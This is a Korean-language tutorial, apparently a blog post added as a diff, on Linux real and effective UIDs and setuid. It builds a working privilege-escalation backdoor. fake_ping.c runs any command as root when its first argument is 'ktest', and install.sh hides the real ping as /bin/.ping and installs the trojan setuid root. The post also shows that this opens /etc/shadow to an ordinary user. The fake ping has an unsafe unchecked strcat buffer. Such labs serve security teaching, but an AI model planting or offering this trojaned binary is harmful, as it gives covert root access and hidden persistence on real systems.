@@ -15,3 +15,214 @@
 
 <br>
 
+uid, gid 확인
+
+![2022-10-18-02-확인](../images/2022-10-18-LinuxBackdoor/2022-10-18-02-확인.jpg)
+
+<br>
+
+UID 를 중복으로 사용할수 있는 옵션 
+
+```
+# man useradd 
+~
+-o, --non-unique
+           Allow the creation of a user account with a duplicate (non-unique) UID.(UID 중복 가능) 
+           This option is only valid in combination with the -u option.
+```
+
+![2022-10-18-03-옵션](../images/2022-10-18-LinuxBackdoor/2022-10-18-03-옵션.jpg)
+
+비밀번호는 /etc/shadow에 해시값으로 저장되어 있습니다.
+
+<br>
+
+어떤 사용자도 /etc/shadow에 대한 퍼미션이 존재하지 않음 (단 root 는 제외)
+
+![2022-10-18-04-쉐도우](../images/2022-10-18-LinuxBackdoor/2022-10-18-04-쉐도우.jpg)
+
+<br>
+
+RUID(Real) , EUID(Effective)
+
+passwd 파일이 관리자의 권한으로 실행될경우 일반 사용
+
+![2022-10-18-05-설정](../images/2022-10-18-LinuxBackdoor/2022-10-18-05-설정.jpg)
+
+<br>
+
+getuid.c 만들기
+
+```
+yum -y install gcc 
+
+vim /root/getuid.c  - ruid ,euid  확인 도구 
+#include <stdio.h>
+
+int main()
+{
+ int ruid,euid;
+ ruid = getuid();
+ euid = geteuid();
+
+ printf("RUID : %d\n",ruid);
+ printf("EUID : %d\n",euid);
+ return 0;
+}
+```
+
+<br>
+
+컴파일 후 실행
+
+![2022-10-18-07-컴파일](../images/2022-10-18-LinuxBackdoor/2022-10-18-07-컴파일.jpg)
+
+<br>
+
+ktest -> setuid 확인 해보기
+
+getuid 에 setuid 를 부여
+
+![2022-10-18-08-퍼미션](../images/2022-10-18-LinuxBackdoor/2022-10-18-08-퍼미션.jpg)
+
+<br>
+
+ktest 의 홈디렉터리에 복사 
+
+![2022-10-18-09-복사](../images/2022-10-18-LinuxBackdoor/2022-10-18-09-복사.jpg)
+
+<br>
+
+ktest에서 확인
+
+![2022-10-18-10-실행](../images/2022-10-18-LinuxBackdoor/2022-10-18-10-실행.jpg)
+
+<br>
+
+getuid_root.c 파일 만들기
+
+- passwd 파일의 동작 원리를 확인
+- euid  를 검증하여 root 가 아니면 인자를 못쓰게 만드는 방법
+
+```
+vim /root/getuid_root.c
+#include <stdio.h>
+
+int main(int argc, char **argv)
+{
+
+        int ruid,euid;
+
+        ruid = getuid();
+        euid = geteuid();
+
+        if(argc > 1 && ruid !=0)
+        {
+                printf("%s : root 로만 사용자를 지정할수 있습니다. \n",argv[0]);
+                return -1;
+        }
+        printf("프로 그램 실행\n");
+        return 0;
+}
+```
+
+<br>
+
+컴파일 후 ktest로 복사
+
+![2022-10-18-11-컴파일후 복사](../images/2022-10-18-LinuxBackdoor/2022-10-18-11-컴파일후 복사.jpg)
+
+<br>
+
+root에서 확인
+
+![2022-10-18-12-루트확인](../images/2022-10-18-LinuxBackdoor/2022-10-18-12-루트확인.jpg)
+
+인자가 있든 없든 잘 실행되는 모습 입니다.
+
+<br>
+
+ktest에서 확인
+
+![2022-10-18-13-ktest확인](../images/2022-10-18-LinuxBackdoor/2022-10-18-13-ktest확인.jpg)
+
+ktest에서는 인자가 있으면 실행이 되지 않았습니다.
+
+이로써 root 로만 사용자를 지정할 수 있다는 부분을 알 수 있습니다.
+
+<br>
+
+fake_ping.c 파일 만들기
+
+- 가짜 ping 이라는 파일만들어서 root 퍼미션으로 실행 하도록 몰래 만드는 것
+- ping  ktest /etc/shadow 파일이 열림
+
+우선 진짜 ping을 백업 해 두겠습니다.
+
+![2022-10-18-14-ping백업](../images/2022-10-18-LinuxBackdoor/2022-10-18-14-ping백업.jpg)
+
+<br>
+
+fake_ping.c 소스 코드 작성 후 컴파일
+
+```
+vim /root/fake_ping.c
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+ 
+int main(int argc, char **argv){
+    setuid(0);
+ 
+    if(!strcmp(argv[1],"ktest")){
+        system(argv[2]);
+        exit(0);
+    }
+ 
+    char input_cmd[100];
+    int i;
+ 
+    memset(input_cmd, 0, 20);
+    strcat(input_cmd,".");
+ 
+    for(i=0; i<argc; i++){
+        strcat(input_cmd, argv[i]);
+        strcat(input_cmd, " ");
+    }
+    system(input_cmd);
+}
+```
+
+![2022-10-18-15-컴파일](../images/2022-10-18-LinuxBackdoor/2022-10-18-15-컴파일.jpg)
+
+<br>
+
+가짜 ping 설치 스크립트 : install.sh 작성 후 실행
+
+```
+vim /root/install.sh
+
+if [ -f /bin/.ping ]
+then
+	echo "이미 설치되어 있습니다."
+else
+	gcc -o fake_ping fake_ping.c || exit
+	mv /bin/ping /bin/.ping
+	mv fake_ping /bin/ping 
+  chmod 4755 /bin/ping
+fi
+```
+
+![2022-10-18-16-스크립트](../images/2022-10-18-LinuxBackdoor/2022-10-18-16-스크립트.jpg)
+
+<br>
+
+ping 이 잘 동작되는데 인자가 ktest 가 따라오면 root 퍼미션을 가지게 실행
+
+![2022-10-18-17-ping](../images/2022-10-18-LinuxBackdoor/2022-10-18-17-ping.jpg)
+
+![2022-10-18-18-car](../images/2022-10-18-LinuxBackdoor/2022-10-18-18-car.jpg)
+
+<br>
+
